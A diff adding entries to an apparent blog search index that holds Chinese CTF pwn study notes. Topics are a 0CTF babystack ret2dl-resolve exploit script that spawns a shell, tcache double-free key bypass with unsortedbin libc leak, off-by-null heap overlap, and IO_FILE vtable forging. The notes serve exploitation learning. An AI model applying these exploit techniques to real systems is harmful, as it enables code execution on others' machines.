@@ -1,6 +1,360 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>0CTF_2018_babystack</title>
+    <url>/2021/08/02/0CTF2018-babystack/</url>
+    <content><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>作为ret2dl的复习题。</p>
+<h2 id="2）exploitation"><a href="#2）exploitation" class="headerlink" title="2）exploitation"></a>2）exploitation</h2><p>溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。</p>
+<p>并且没有aslr，relro为partial。</p>
+<p>非常典型的ret2dl。</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>可以直接用roputils做</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> roputils<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>offset = <span class="hljs-number">44</span><br>readplt = <span class="hljs-number">0x08048300</span><br>bss = <span class="hljs-number">0x0804a020</span><br>vulFunc = <span class="hljs-number">0x0804843B</span><br><br>p = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getReloc</span>(<span class="hljs-params">elf, base</span>):</span><br>    jmprel = elf.dynamic(<span class="hljs-string">&#x27;JMPREL&#x27;</span>)<br>    relent = elf.dynamic(<span class="hljs-string">&#x27;RELENT&#x27;</span>)<br><br>    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)<br>    reloc_offset = addr_reloc - jmprel<br>    <span class="hljs-keyword">return</span> reloc_offset<br><br>rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)<br><br><span class="hljs-comment"># step1 : write sh &amp; resolve struct to bss</span><br>buf1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset <span class="hljs-comment">#44</span><br>buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="hljs-number">0</span>) + p32(addr_bss) + p32(<span class="hljs-number">100</span>)<br>p.send(buf1)<br><br>buf2 =  rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">20</span>, buf2)<br>buf2 += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">100</span>, buf2)<br>p.send(buf2)<br><br><span class="hljs-comment">#step2 : use dl_resolve_call get system &amp; system(&#x27;/bin/sh&#x27;)</span><br>buf3 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span> + rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)<br>p.send(buf3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tcahce学习</title>
+    <url>/2021/08/17/Heap%E2%80%94%E2%80%94Tcache%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Tcahce学习"><a href="#Tcahce学习" class="headerlink" title="Tcahce学习"></a>Tcahce学习</h1><h2 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h2><p>说是Tcache学习，实际上是lonelywolf的复现。</p>
+<p>网上wp都是神仙写的，一点也不萌新友好。我都看不懂（）</p>
+<p>打开题发现这个菜单题好常规。</p>
+<p>但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。                                                                                                   具体的参考可以看<a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a>。但是在这道题里面充其量算一个trick而不是核心考点。</p>
+<h2 id="1）漏洞点"><a href="#1）漏洞点" class="headerlink" title="1）漏洞点"></a>1）漏洞点</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-18h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  __printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;number, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( !v1 &amp;&amp; buf )<br>    <span class="hljs-built_in">free</span>(buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>漏洞点。经典uaf。</p>
+<p>之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          read(<span class="hljs-number">0</span>, v0, <span class="hljs-number">1uLL</span>);<br>          <span class="hljs-keyword">if</span> ( *v0 == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( ++v0 == v1 )<br>            <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>        &#125;<br>        *v0 = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
+
+<p>然后有一个比较怪的点就是这里的 <code> __readfsqword();</code>。很明显他是一个和读取有关的函数，但是ida根本点不进去。</p>
+<p>后面我才知道这个函数是和canary保护有关。</p>
+<p>根据微软官方文档<a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-160">…</a>这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。</p>
+<p>但是好像说了和没说一样。</p>
+<p>回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。<a href="https://toutiao.io/posts/o5yed8w/preview">Canary安全机制原理实战分析</a></p>
+<p>![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png)</p>
+<h2 id="2）漏洞利用"><a href="#2）漏洞利用" class="headerlink" title="2）漏洞利用"></a>2）漏洞利用</h2><h3 id="1）Tcache-double-free"><a href="#1）Tcache-double-free" class="headerlink" title="1）Tcache double free"></a>1）Tcache double free</h3><p>之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。</p>
+<p>虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>gdb.attach(p)<br>pause()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>首先先分配再释放一下，看看这个题具体的内存分布有什么特点。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs c#">pwndbg&gt; hea<br>Allocated chunk | PREV_INUSE<br>Addr: 0x55e9c994c000<br>Size: 0x251<br><br>Free chunk (tcache) | PREV_INUSE<br>Addr: 0x55e9c994c250<br>Size: 0x71<br>fd: 0x00<br><br>Top chunk | PREV_INUSE<br>Addr: 0x55e9c994c2c0<br>Size: 0x20d41<br><br>pwndbg&gt; bin<br>tcachebins<br>0x70 [  1]: 0x55e9c994c260 ◂— 0x0<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br><br></code></pre></td></tr></table></figure>
+
+<p>之前一直不是很清楚</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x55e9c994c000</span><br>Size: <span class="hljs-number">0x251</span><br></code></pre></td></tr></table></figure>
+
+<p>这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。</p>
+<p>然后这边</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x70</span> [  <span class="hljs-number">1</span>]: <span class="hljs-number">0x55e9c994c260</span> ◂— <span class="hljs-number">0x0</span> <span class="hljs-comment">//说明0x70大小的Tcache里只有一个Tcache chunk，</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">562</span>fcfd<span class="hljs-number">39000</span><br><span class="hljs-attribute">0x562fcfd39000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000251</span><br><span class="hljs-attribute">0x562fcfd39010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000010000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39050</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39060</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x562fcfd39070</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000562</span>fcfd<span class="hljs-number">39260</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这是控制堆块的部分结构</p>
+<p><code>0x562fcfd39010:    0x0000010000000000    0x0000000000000000</code>中，1说明只有一个Tcache。</p>
+<p>T擦车堆块的首地址也记录在内。从<code>0x562fcfd39050</code>开始分别记录0x20到0x70的Tcache chunk的首地址，比如<code>0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260</code>,记录的就是0x70大小chunk的首地址。</p>
+<blockquote>
+<p>喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。</p>
+</blockquote>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">56533012</span>f<span class="hljs-number">250</span><br><span class="hljs-attribute">0x56533012f250</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000071</span><br><span class="hljs-attribute">0x56533012f260</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">000056533012</span>f<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>
+
+<p>我们到Tcache的地址中看一看，会发现<code>0x56533012f260:    0x0000000000000000    0x000056533012f010</code>处的<code>0x000056533012f010</code>，这是一个key值。</p>
+<h4 id="2-29下Tcahce-double-free的检测"><a href="#2-29下Tcahce-double-free的检测" class="headerlink" title="2.29下Tcahce double free的检测"></a>2.29下Tcahce double free的检测</h4><p>之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是</p>
+<p>对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry)</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//链表指针，对应chunk中的fd字段</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span>  <span class="hljs-comment">//指向所属的tcache结构体，对应chunk中的bk字段</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>也就是所谓的key对应的就是chunk的bk字段。</p>
+<p>当chunk被free，放入Tcache链表时，操作如下。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"> <br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span><span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);<br> <br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;  <span class="hljs-comment">//设置所属的tcache</span><br> <br>  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="hljs-comment">//单链表头插法</span><br>  tcache-&gt;entries[tc_idx] = e;  <br> <br>  ++(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">//计数增加</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后进行free操作</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span><br><span class="hljs-comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//剪枝</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。</p>
+<p>大致是</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;aaaa&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p>再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。</p>
+<p>然后我们需要构造出unsortedbin chunk、</p>
+<p>但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。</p>
+<p>那么有什么办法能构造出unsortedbin呢？<br>回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？</p>
+<p>如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？</p>
+<p>然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。</p>
+<p>总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。</p>
+<p>然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。</p>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。</p>
+<p>但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/A951860555/article/details/116910945">2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分</a></p>
+<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a></p>
+<p><a href="https://www.bilibili.com/video/BV1Sy4y1W7h2">CISCN2021 lonelywolf</a></p>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tcache利用</title>
+    <url>/2021/08/13/Heap-Tcache%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h3 id="Tcache-利用"><a href="#Tcache-利用" class="headerlink" title="Tcache 利用"></a>Tcache 利用</h3><p>不是学习不是学习不是学习，</p>
+<p>例题是lctf2018的easyheap。</p>
+<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。</p>
+<p>然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">sub_BEC</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a2 )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      read(<span class="hljs-number">0</span>, &amp;a1[v3], <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( a2 - <span class="hljs-number">1</span> &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v3 || !a1[v3] || a1[v3] == <span class="hljs-number">10</span> )<br>        <span class="hljs-keyword">break</span>;<br>      ++v3;<br>    &#125;<br>    a1[v3] = <span class="hljs-number">0</span>;<br>    a1[a2] = <span class="hljs-number">0</span>;<span class="hljs-comment">//loophole</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a1 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。</p>
+<p>在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。</p>
+<p>包括ciscn lonelywolf也是利用到了这一点。</p>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IO_FILE学习</title>
+    <url>/2021/08/09/io_file/</url>
+    <content><![CDATA[<p>io_file学习笔记</p>
+<h3 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
+<p>结构源码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
+<p>以fread为例子简述io_file结构调用的流程</p>
+<h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
+<p>下面是<code>_IO_sgetn</code>的源码。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-keyword">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
+<p>也就是<code>_IO_XSGETN</code>。</p>
+<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
+<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
+<p><code>_IO_jump_t</code>源码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
+<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
+<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>函数源码如上，实现的是一个键盘输入。 </p>
+<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
+<h3 id="伪造vtable"><a href="#伪造vtable" class="headerlink" title="伪造vtable"></a>伪造vtable</h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
+<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>
+<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>
+<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
+<p>但是我们先从第一个方法来试一试。</p>
+<p>示例来源于ctf-wiki</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这边利用的具体步骤比较直观。</p>
+<p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
+<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
+<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
+<p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; <span class="hljs-built_in">print</span> _IO_2_1_stdin_<br><span class="hljs-variable">$2</span> = &#123;<br>  file = &#123;<br>    _flags = -72540024, <br>    _IO_read_ptr = 0x0, <br>    _IO_read_end = 0x0, <br>    _IO_read_base = 0x0, <br>    _IO_write_base = 0x0, <br>    _IO_write_ptr = 0x0, <br>    _IO_write_end = 0x0, <br>    _IO_buf_base = 0x0, <br>    _IO_buf_end = 0x0, <br>    _IO_save_base = 0x0, <br>    _IO_backup_base = 0x0, <br>    _IO_save_end = 0x0, <br>    _markers = 0x0, <br>    _chain = 0x0, <br>    _fileno = 0, <br>    _flags2 = 0, <br>    _old_offset = -1, <br>    _cur_column = 0, <br>    _vtable_offset = 0 <span class="hljs-string">&#x27;\000&#x27;</span>, <br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>, <br>    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, <br>    _offset = -1, <br>    _codecvt = 0x0, <br>    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, <br>    _freeres_list = 0x0, <br>    _freeres_buf = 0x0, <br>    __pad5 = 0, <br>    _mode = 0, <br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;, <br>  vtable = 0x7ffff7dca2a0 